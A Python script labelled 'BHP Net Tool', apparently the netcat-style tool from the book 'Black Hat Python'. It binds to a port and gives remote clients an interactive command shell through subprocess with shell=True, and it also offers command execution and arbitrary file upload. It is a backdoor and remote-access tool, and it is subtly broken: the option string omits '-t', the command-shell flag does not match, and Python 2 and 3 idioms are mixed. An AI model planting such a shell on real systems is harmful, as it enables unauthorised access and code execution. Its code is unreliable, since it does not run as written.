import sys
import socket
import getopt
import threading
import subprocess

# global variables
listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0

def usage():
    print('BHP Net Tool\n')
    print('Usage: netcat.py -t target_host -p port')
    print('-l --listen')
    print('-e --execute')
    print('-c --command')
    print('-u --upload=destination\n')

    sys.exit(0)

def main():
    global listen
    global command
    global upload
    global execute
    global target
    global upload_destination
    global port

    if not len(sys.argv[1:]):
        usage()

    # Read cli options
    try:
        opts, args = getopt.getopt(sys.argv[1:], 
            'hle:5:p:cu:', ['help', 'listen', 'execute', 
            'target', 'port', 'command', 'upload'])
    except getopt.GetoptError as err:
        print(err)
        usage()

    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = a
        elif o in ('-c', '--commandshell'):
            command = True
        elif o in ('-u', '--upload'):
            upload_destination = a
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-p', '--port'):
            port = int(a)
        else:
            assert False, 'Unhandled Option'
        
    # Do we listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()

        # send data
        client_sender(buffer)

    if listen:
        server_loop()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))
        
        if len(buffer):
            client.send(buffer)
        while True:
            # wait for data
            recv_len = 1
            response = ''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response)

            # wait for more input
            buffer = raw_input('')
            buffer += '\n'

            client.send(buffer)
        
    except:
        print('[*] Exception! Exiting')
        client.close()

def server_loop():
    global target

    # listen on all interfaces when no defined target
    if not len(target):
        target = '0.0.0.0'

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # create thread for new client handler
        client_thread = threading.Thread(target=client_handler,
                args=(client_socket,))
        client_thread.start()

def run_command(command):
    # trim newline
    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT,
                shell=True)
    except:
        output = 'Failed to execute command.\r\n'

    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    # check for upload
    if len(upload_destination):
        # read all bytes and write to dest.
        file_buffer = ''

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, 'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send('Success!')
        except:
            client_socket.send('Failure')

    if len(execute):
        output = run_command(execute)

        client_socket.send(output)

    if command:
        while True:
            # Show a simple prompt
            client_socket.send('<BHP:#> ')

            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            response = run_command(cmd_buffer)
            client_socket.send(response)

main()
